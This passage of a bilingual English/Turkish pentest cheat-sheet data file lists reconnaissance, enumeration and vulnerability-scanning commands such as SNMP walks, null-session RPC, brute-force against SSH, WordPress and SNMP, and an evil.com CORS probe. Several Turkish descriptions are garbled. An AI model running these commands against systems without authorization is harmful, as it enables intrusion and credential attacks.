            "cmd": "nbtscan -v <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Al: NetBIOS info for single target"
          },
          {
            "title": "NBTScan Subnet",
            "desc": "NetBIOS name scan",
            "cmd": "nbtscan -r <NETWORK>/<CIDR>",
            "tags": [
              "essential"
            ],
            "desc_tr": "NetBIOS name tarama"
          },
          {
            "title": "enum4linux-ng",
            "desc": "Next-gen SMB enumeration",
            "cmd": "enum4linux-ng -A <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Next-gen SMB listeleme"
          }
        ],
        "name_tr": "SMB & NetBIOS Probing"
      },
      {
        "name": "SNMP Discovery",
        "commands": [
          {
            "title": "SNMPWalk Full Tree",
            "desc": "Walk the entire SNMP MIB tree with community string",
            "cmd": "snmpwalk -v2c -c public <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Walk the entire SNMP MIB tree community string ile"
          },
          {
            "title": "SNMPWalk System Info",
            "desc": "Retrieve system description",
            "cmd": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.1",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: system description"
          },
          {
            "title": "SNMPWalk Running Processes",
            "desc": "Enumerate running processes via SNMP",
            "cmd": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: çalışan process SNMP üzerinden"
          },
          {
            "title": "SNMPWalk Installed Software",
            "desc": "Enumerate installed software",
            "cmd": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Listele: yüklü software"
          },
          {
            "title": "SNMPWalk TCP Connections",
            "desc": "Enumerate active TCP connections",
            "cmd": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.6.13.1.3",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Listele: active TCP connections"
          },
          {
            "title": "SNMPWalk User Accounts",
            "desc": "Enumerate Windows user accounts via SNMP",
            "cmd": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.4.1.77.1.2.25",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: Windows user accounts SNMP üzerinden"
          },
          {
            "title": "OneSixtyOne Community Brute",
            "desc": "Brute force SNMP community strings",
            "cmd": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SNMP community strings"
          },
          {
            "title": "SNMP-Check Full Enum",
            "desc": "Comprehensive SNMP enumeration",
            "cmd": "snmp-check <TARGET_IP> -c public",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kapsamlı SNMP listeleme"
          },
          {
            "title": "OneSixtyOne with SecLists",
            "desc": "Brute force SNMP community strings with SecLists wordlist",
            "cmd": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SNMP community strings SecLists kelime listesi ile"
          },
          {
            "title": "SNMPWalk NET-SNMP-EXTEND (RCE Check)",
            "desc": "Check for custom SNMP extensions — may reveal RCE or sensitive scripts",
            "cmd": "snmpwalk -c <COMMUNITY> -v 1 <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendObjects",
            "tags": [
              "advanced"
            ],
            "note": "If extend scripts exist, they may run OS commands — check nsExtendOutputFull for output",
            "desc_tr": "Kontrol et: for özel SNMP extensions — may reveal RCE or sensitive scripts"
          },
          {
            "title": "SNMPWalk v1 Full Walk",
            "desc": "Full SNMP v1 walk with custom community string",
            "cmd": "snmpwalk -c <COMMUNITY> -v 1 <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Tam SNMP v1 walk özel community string ile"
          }
        ],
        "name_tr": "SNMP Discovery"
      },
      {
        "name": "LDAP & RPC Queries",
        "commands": [
          {
            "title": "LDAPSearch Anonymous Bind",
            "desc": "Attempt anonymous LDAP enumeration",
            "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -b '' -s base namingcontexts",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dene: anonymous LDAP listeleme"
          },
          {
            "title": "LDAPSearch Dump All",
            "desc": "Dump entire LDAP directory with credentials",
            "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: entire LDAP directory kimlik bilgileri ile"
          },
          {
            "title": "LDAPSearch Find Users",
            "desc": "Extract all user objects from LDAP",
            "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' '(objectClass=user)' sAMAccountName",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: tüm user objects LDAP üzerinden"
          },
          {
            "title": "LDAPSearch Find Computers",
            "desc": "Extract computer objects from LDAP",
            "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' '(objectClass=computer)' cn",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çıkart: computer objects LDAP üzerinden"
          },
          {
            "title": "RPCClient Null Session",
            "desc": "Connect with null session to enumerate",
            "cmd": "rpcclient -U '' -N <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: boş oturum enumerate ile'e"
          },
          {
            "title": "RPCClient Enum Domain Users",
            "desc": "Enumerate domain users via RPC",
            "cmd": "rpcclient -U '' -N <TARGET_IP> -c 'enumdomusers'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: etki alanı kullanıcıları RPC üzerinden"
          },
          {
            "title": "RPCClient Enum Domain Groups",
            "desc": "Enumerate domain groups via RPC",
            "cmd": "rpcclient -U '' -N <TARGET_IP> -c 'enumdomgroups'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: etki alanı grupları RPC üzerinden"
          },
          {
            "title": "RPCClient Query User",
            "desc": "Get details for a specific user RID",
            "cmd": "rpcclient -U '' -N <TARGET_IP> -c 'queryuser 0x1f4'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Al: details for a belirli user RID"
          },
          {
            "title": "RPCClient Enum Printers",
            "desc": "Enumerate printers via RPC",
            "cmd": "rpcclient -U '' -N <TARGET_IP> -c 'enumprinters'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Listele: printers RPC üzerinden"
          },
          {
            "title": "RPCClient Server Info",
            "desc": "Get server info via RPC",
            "cmd": "rpcclient -U '' -N <TARGET_IP> -c 'srvinfo'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: server info RPC üzerinden"
          },
          {
            "title": "Finger User Enumeration",
            "desc": "Enumerate users via finger service",
            "cmd": "finger @<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: users finger service üzerinden"
          },
          {
            "title": "Finger Specific User",
            "desc": "Query specific user via finger",
            "cmd": "finger <USER>@<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Sorgula: belirli user finger üzerinden"
          },
          {
            "title": "Ident User Enum",
            "desc": "Enumerate users via identd service",
            "cmd": "ident-user-enum <TARGET_IP> 22 113 445",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: users identd service üzerinden"
          },
          {
            "title": "SMTP User Enum VRFY",
            "desc": "Enumerate users via SMTP VRFY command",
            "cmd": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: users SMTP VRFY command üzerinden"
          },
          {
            "title": "SMTP User Enum RCPT",
            "desc": "Enumerate users via SMTP RCPT TO",
            "cmd": "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: users SMTP RCPT üzerinden'e"
          },
          {
            "title": "Finger Enumeration",
            "desc": "Enumerate users via finger",
            "cmd": "finger @<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: users finger üzerinden"
          },
          {
            "title": "SMTP User VRFY",
            "desc": "Verify users via SMTP",
            "cmd": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Doğrula: users SMTP üzerinden"
          },
          {
            "title": "SMTP User RCPT",
            "desc": "Enumerate via RCPT TO",
            "cmd": "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: RCPT üzerinden'e"
          },
          {
            "title": "SMTP User EXPN",
            "desc": "Expand mailing lists",
            "cmd": "smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Expand mailing lists"
          }
        ],
        "name_tr": "LDAP & RPC Queries"
      },
      {
        "name": "HTTP Footprinting",
        "commands": [
          {
            "title": "WhatWeb Fingerprint",
            "desc": "Identify web technologies and CMS",
            "cmd": "whatweb <TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Tespit et: web technologies and CMS"
          },
          {
            "title": "WhatWeb Aggressive",
            "desc": "Aggressive web technology fingerprinting",
            "cmd": "whatweb -a 3 http://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Aggressive web technology fingerprinting"
          },
          {
            "title": "Curl Headers",
            "desc": "Retrieve HTTP response headers",
            "cmd": "curl -I http://<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: HTTP response headers"
          },
          {
            "title": "Curl Full Response",
            "desc": "Get full HTTP response with headers",
            "cmd": "curl -v http://<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: full HTTP response headers ile"
          },
          {
            "title": "Curl Follow Redirects",
            "desc": "Follow redirects and show final page",
            "cmd": "curl -L http://<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Follow redirects and show final page"
          },
          {
            "title": "Curl Custom Method",
            "desc": "Send request with specific HTTP method",
            "cmd": "curl -X OPTIONS http://<TARGET_IP> -v",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Send request belirli HTTP method ile"
          },
          {
            "title": "Nikto Web Scan",
            "desc": "Comprehensive web server vulnerability scanner",
            "cmd": "nikto -h http://<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kapsamlı web server zafiyet(ler) tarayıcı"
          },
          {
            "title": "Nikto with Port",
            "desc": "Nikto scan on non-standard port",
            "cmd": "nikto -h http://<TARGET_IP>:<PORT>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Niktarama non-standard port üzerinde'e"
          },
          {
            "title": "Nikto SSL Scan",
            "desc": "Nikto scan with SSL",
            "cmd": "nikto -h https://<TARGET_IP> -ssl",
            "tags": [
              "tool"
            ],
            "desc_tr": "Niktarama SSL ile'e"
          },
          {
            "title": "WAF Detection with wafw00f",
            "desc": "Detect Web Application Firewalls",
            "cmd": "wafw00f http://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Algıla: Web ApplicatiFirewalls üzerinde"
          },
          {
            "title": "wafw00f All WAFs",
            "desc": "Test against all known WAF signatures",
            "cmd": "wafw00f -a http://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Test et: tüm known WAF signatures'e karşı"
          },
          {
            "title": "Curl HTTP Methods Check",
            "desc": "Test allowed HTTP methods with OPTIONS",
            "cmd": "curl -X OPTIONS http://<TARGET_IP>/ -I",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: allowed HTTP methods OPTIONS ile"
          },
          {
            "title": "Curl Custom Host Header",
            "desc": "Send request with custom Host header for vhost testing",
            "cmd": "curl -H 'Host: <VHOST>' http://<TARGET_IP>/",
            "tags": [
              "essential"
            ],
            "desc_tr": "Send request özel Host header for vhost testing ile"
          },
          {
            "title": "WhatWeb Verbose Output",
            "desc": "Detailed web tech fingerprinting with verbose",
            "cmd": "whatweb -v http://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Detailed web tech fingerprinting verbose ile"
          },
          {
            "title": "Nmap HTTP Title",
            "desc": "Grab web page titles via nmap NSE",
            "cmd": "nmap --script http-title -p 80,443,8080,8443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Grab web page titles nmap NSE üzerinden"
          },
          {
            "title": "Nmap HTTP Headers",
            "desc": "Extract HTTP headers via nmap NSE",
            "cmd": "nmap --script http-headers -p 80,443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: HTTP headers nmap NSE üzerinden"
          },
          {
            "title": "Curl CORS Test",
            "desc": "Test for CORS misconfiguration",
            "cmd": "curl -s -I -H 'Origin: https://evil.com' http://<TARGET_IP>/ | grep -i 'Access-Control'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: for CORS misconfiguration"
          },
          {
            "title": "WAF Detection",
            "desc": "Detect web app firewalls",
            "cmd": "wafw00f http://<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Algıla: web app firewalls"
          },
          {
            "title": "WAF Fingerprint All",
            "desc": "Test all WAF signatures",
            "cmd": "wafw00f -a http://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Test et: tüm WAF signatures"
          },
          {
            "title": "cURL Security Headers",
            "desc": "Check security headers",
            "cmd": "curl -sI http://<TARGET_IP> | grep -iE 'server|x-powered|x-frame|content-security|strict-transport'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: security headers"
          },
          {
            "title": "cURL Check Methods",
            "desc": "Test allowed HTTP methods",
            "cmd": "curl -sI -X OPTIONS http://<TARGET_IP> | grep -i allow",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: allowed HTTP methods"
          }
        ],
        "name_tr": "HTTP Footprinting"
      }
    ],
    "name_tr": "Hedef Profilleme ve Ağ Haritalama",
    "description_tr": "Enumerate targets through passive intelligence gathering, active scanning, and service fingerprinting to build a complete attack surface map."
  },
  {
    "id": "vuln-assessment",
    "name": "Weakness Identification & Scanning",
    "icon": "⚡",
    "description": "Identify known vulnerabilities and misconfigurations across network services and web applications using automated scanners and targeted scripts.",
    "subcategories": [
      {
        "name": "Network-Level Scanning",
        "commands": [
          {
            "title": "Nmap Vuln Scripts",
            "desc": "Run all vuln-category NSE scripts",
            "cmd": "nmap --script vuln -p <PORTS> -Pn <TARGET_IP> -oN nmap_vuln.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: tüm vuln-category NSE scripts"
          },
          {
            "title": "Nmap MS17-010 (EternalBlue)",
            "desc": "Check for EternalBlue SMB vulnerability",
            "cmd": "nmap --script smb-vuln-ms17-010 -p 445 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: for EternalBlue SMB zafiyet(ler)"
          },
          {
            "title": "Nmap MS08-067 (Conficker)",
            "desc": "Check for MS08-067 NetAPI vulnerability",
            "cmd": "nmap --script smb-vuln-ms08-067 -p 445 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: for MS08-067 NetAPI zafiyet(ler)"
          },
          {
            "title": "Nmap Heartbleed Check",
            "desc": "Test for OpenSSL Heartbleed vulnerability",
            "cmd": "nmap --script ssl-heartbleed -p 443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: for OpenSSL Heartbleed zafiyet(ler)"
          },
          {
            "title": "Nmap Shellshock Check",
            "desc": "Test for Bash Shellshock vulnerability",
            "cmd": "nmap --script http-shellshock --script-args uri=/cgi-bin/<SCRIPT> -p 80 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: for Bash Shellshock zafiyet(ler)"
          },
          {
            "title": "Nmap SMB Vuln Scan All",
            "desc": "Check for all SMB vulnerabilities",
            "cmd": "nmap --script 'smb-vuln-*' -p 445 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: for tüm SMB zafiyet(ler)"
          },
          {
            "title": "Nmap FTP Anonymous Check",
            "desc": "Check for anonymous FTP login",
            "cmd": "nmap --script ftp-anon -p 21 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: for anonymous FTP login"
          },
          {
            "title": "Nmap HTTP Methods Check",
            "desc": "Enumerate allowed HTTP methods (PUT, DELETE)",
            "cmd": "nmap --script http-methods -p 80,443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: allowed HTTP methods (PUT, DELETE)"
          },
          {
            "title": "Nmap HTTP Robots Check",
            "desc": "Retrieve and display robots.txt",
            "cmd": "nmap --script http-robots.txt -p 80,443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: and display robots.txt"
          },
          {
            "title": "Nmap HTTP Enum",
            "desc": "Enumerate common web directories and files",
            "cmd": "nmap --script http-enum -p 80,443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: commweb directories and files üzerinde"
          },
          {
            "title": "Nmap RDP Bluekeep Check",
            "desc": "Check for CVE-2019-0708 BlueKeep",
            "cmd": "nmap --script rdp-vuln-ms12-020 -p 3389 -Pn <TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Kontrol et: for CVE-2019-0708 BlueKeep"
          },
          {
            "title": "SSLScan Full Analysis",
            "desc": "Analyze SSL/TLS ciphers and certificates",
            "cmd": "sslscan <TARGET_IP>:443",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Analiz et: SSL/TLS ciphers and certificates"
          },
          {
            "title": "TestSSL Full Test",
            "desc": "Comprehensive SSL/TLS testing",
            "cmd": "testssl.sh https://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kapsamlı SSL/TLS testing"
          },
          {
            "title": "TestSSL Vulnerabilities Only",
            "desc": "Test for known SSL vulnerabilities only",
            "cmd": "testssl.sh --vulnerable https://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Test et: for known SSL zafiyet(ler) only"
          },
          {
            "title": "Nmap SSL Enum Ciphers",
            "desc": "Enumerate SSL/TLS ciphers and protocols",
            "cmd": "nmap --script ssl-enum-ciphers -p 443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: SSL/TLS ciphers and protocols"
          },
          {
            "title": "Nmap SSL Certificate Info",
            "desc": "Extract SSL certificate details",
            "cmd": "nmap --script ssl-cert -p 443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: SSL certificate details"
          },
          {
            "title": "Nmap SSH Brute Force",
            "desc": "Brute force SSH via NSE",
            "cmd": "nmap --script ssh-brute -p 22 -Pn <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH NSE üzerinden"
          },
          {
            "title": "Nmap FTP Bounce Check",
            "desc": "Check for FTP bounce attack",
            "cmd": "nmap --script ftp-bounce -p 21 -Pn <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kontrol et: for FTP bounce attack"
          },
          {
            "title": "Nmap SMTP Open Relay",
            "desc": "Check for open SMTP relay",
            "cmd": "nmap --script smtp-open-relay -p 25 -Pn <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kontrol et: for open SMTP relay"
          },
          {
            "title": "Nmap NFS Enumeration",
            "desc": "Enumerate NFS exports and permissions",
            "cmd": "nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 111,2049 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: NFS exports and permissions"
          },
          {
            "title": "Nmap MySQL Audit",
            "desc": "Run MySQL audit and empty password check",
            "cmd": "nmap --script mysql-empty-password,mysql-info,mysql-enum -p 3306 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: MySQL audit and empty password check"
          },
          {
            "title": "Nmap LDAP RootDSE",
            "desc": "Query LDAP root DSE for domain info",
            "cmd": "nmap --script ldap-rootdse -p 389 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Sorgula: LDAP root DSE for domainfo içinde"
          },
          {
            "title": "Nmap DNS Brute Force",
            "desc": "Brute force DNS subdomains via NSE",
            "cmd": "nmap --script dns-brute --script-args dns-brute.domain=<DOMAIN> -Pn <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı DNS subdomains NSE üzerinden"
          },
          {
            "title": "Nmap vsftpd Backdoor",
            "desc": "Test vsftpd 2.3.4 backdoor",
            "cmd": "nmap --script ftp-vsftpd-backdoor -p 21 <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: vsftpd 2.3.4 backdoor"
          },
          {
            "title": "Nmap SambaCry",
            "desc": "Test CVE-2017-7494",
            "cmd": "nmap --script smb-vuln-cve-2017-7494 -p 445 <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: CVE-2017-7494"
          },
          {
            "title": "Nmap BlueKeep",
            "desc": "Test CVE-2019-0708",
            "cmd": "nmap --script rdp-vuln-ms12-020 -p 3389 <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: CVE-2019-0708"
          },
          {
            "title": "Nmap IIS Short Names",
            "desc": "Brute force IIS short names",
            "cmd": "nmap --script http-iis-short-name-brute -p 80 <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı IIS short names"
          },
          {
            "title": "Nmap HTTP Config Backup",
            "desc": "Find config backups",
            "cmd": "nmap --script http-config-backup -p 80 <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bul: config backups"
          }
        ],
        "name_tr": "Network-Level Scanning"
      },
      {
        "name": "Web App Scanning",
        "commands": [
          {
            "title": "Nikto Full Web Scan",
            "desc": "Comprehensive web server vulnerability scan",
            "cmd": "nikto -h http://<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kapsamlı web server zafiyet(ler) tarama"
          },
          {
            "title": "Nikto with Tuning",
            "desc": "Nikto scan focused on specific test types",
            "cmd": "nikto -h http://<TARGET_IP> -Tuning 123bde",
            "tags": [
              "tool"
            ],
            "note": "Tuning: 1=files, 2=misconfig, 3=info disclosure, b=software id, d=debug, e=remote sources",
            "desc_tr": "Niktarama focused belirli test types üzerinde'e"
          },
          {
            "title": "Nuclei Default Templates",
            "desc": "Run Nuclei with all default templates",
            "cmd": "nuclei -u http://<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Çalıştır: Nuclei tüm default templates ile"
          },
          {
            "title": "Nuclei Severity Filter",
            "desc": "Run Nuclei for critical and high severity only",
            "cmd": "nuclei -u http://<TARGET_IP> -severity critical,high",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: Nuclei for critical and high severity only"
          },
          {
            "title": "Nuclei Specific Tags",
            "desc": "Run Nuclei templates matching specific tags",
            "cmd": "nuclei -u http://<TARGET_IP> -tags cve,sqli,xss,rce,lfi",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: Nuclei templates matching belirli tags"
          },
          {
            "title": "Nuclei with Target List",
            "desc": "Run Nuclei against multiple targets from file",
            "cmd": "nuclei -l targets.txt -severity critical,high,medium -o nuclei_results.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: Nuclei multiple targets file üzerinden'e karşı"
          },
          {
            "title": "Nuclei Technology-Specific",
            "desc": "Run Nuclei for a specific technology stack",
            "cmd": "nuclei -u http://<TARGET_IP> -tags apache,nginx,iis,tomcat",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: Nuclei for a belirli technology stack"
          },
          {
            "title": "AutoRecon",
            "desc": "Full automated recon",
            "cmd": "autorecon <TARGET_IP> -o autorecon_output",
            "tags": [
              "essential"
            ],
            "note": "Runs nmap, nikto, gobuster etc. automatically",
            "desc_tr": "Tam automated recon"
          },
          {
            "title": "reconFTW",
            "desc": "Complete recon automation",
            "cmd": "./reconftw.sh -d <DOMAIN> -r -o reconftw_output",
            "tags": [
              "tool"
            ],
            "desc_tr": "Complete recautomation üzerinde"
          }
        ],
        "name_tr": "Web App Scanning"
      },
      {
        "name": "CMS-Specific Scanners",
        "commands": [
          {
            "title": "WPScan Full Enumeration",
            "desc": "Full WordPress scan with plugins, themes, users",
            "cmd": "wpscan --url http://<TARGET_IP> -e ap,at,u --plugins-detection aggressive",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Tam WordPress tarama plugins, themes, users ile"
          },
          {
            "title": "WPScan with API Token",
            "desc": "WordPress scan with vulnerability database lookup",
            "cmd": "wpscan --url http://<TARGET_IP> -e ap,at,u --api-token <WPSCAN_TOKEN>",
            "tags": [
              "tool"
            ],
            "desc_tr": "WordPress tarama zafiyet(ler) database lookup ile"
          },
          {
            "title": "WPScan Password Brute Force",
            "desc": "Brute force WordPress login credentials",
            "cmd": "wpscan --url http://<TARGET_IP> -U <USER> -P /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı WordPress logkimlik bilgileri içinde"
          },
          {
            "title": "WPScan Enumerate Vulnerable Plugins",
            "desc": "Enumerate plugins with known vulnerabilities",
            "cmd": "wpscan --url http://<TARGET_IP> -e vp --plugins-detection aggressive",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Listele: plugins known zafiyet(ler) ile"
          },
          {
            "title": "WPScan Enumerate Users",
            "desc": "Enumerate WordPress usernames",
            "cmd": "wpscan --url http://<TARGET_IP> -e u",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Listele: WordPress usernames"
          },
          {
            "title": "WPScan with Custom WP Path",
            "desc": "Scan WordPress on non-standard path",
            "cmd": "wpscan --url http://<TARGET_IP>/<WP_PATH> --wp-content-dir wp-content",
            "tags": [
              "tool"
            ],
            "desc_tr": "Tara: ma WordPress non-standard path üzerinde"
          },
          {
            "title": "JoomScan Full Scan",
            "desc": "Joomla vulnerability scanner",
            "cmd": "joomscan -u http://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Joomla zafiyet(ler) tarayıcı"
          },
          {
            "title": "JoomScan Enum Components",
            "desc": "Enumerate Joomla components",
            "cmd": "joomscan -u http://<TARGET_IP> -ec",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: Joomla components"
          },
          {
            "title": "DroopeScan Drupal",
            "desc": "Scan Drupal installation for vulnerabilities",
            "cmd": "droopescan scan drupal -u http://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Tara: ma Drupal installatifor zafiyet(ler) üzerinde"
          },
          {
            "title": "DroopeScan SilverStripe",
            "desc": "Scan SilverStripe CMS",
            "cmd": "droopescan scan silverstripe -u http://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Tara: ma SilverStripe CMS"
          }
        ],
        "name_tr": "CMS-Specific Scanners"
      }
    ],
    "name_tr": "Zafiyet Tespiti ve Tarama",
    "description_tr": "Identify known vulnerabilities and misconfigurations across network services and web applications using automated scanners and targeted scripts."
  },
  {
    "id": "web-exploitation",
    "name": "Web Attack Techniques",
    "icon": "🌐",
    "description": "Exploit web application vulnerabilities including directory traversal, injection, file upload, and server-side attacks to gain unauthorized access.",
    "subcategories": [
      {
        "name": "Path & Content Discovery",
        "commands": [
          {
            "title": "Gobuster Directory Brute Force",
            "desc": "Brute force directories and files",
            "cmd": "gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı directories and files"
          },
          {
            "title": "Gobuster with Extensions",
            "desc": "Brute force with file extension filter",
            "cmd": "gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak,asp,aspx,jsp -o gobuster_ext.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı file extensifilter ile üzerinde"
          },
          {
            "title": "Gobuster DNS Subdomain",
            "desc": "Brute force subdomains via DNS",
            "cmd": "gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı subdomains DNS üzerinden"
          },
          {
            "title": "Gobuster VHost Brute Force",
            "desc": "Brute force virtual hosts",
            "cmd": "gobuster vhost -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı virtual hosts"
          },
          {
            "title": "Gobuster with Cookies",
            "desc": "Directory brute force with session cookie",
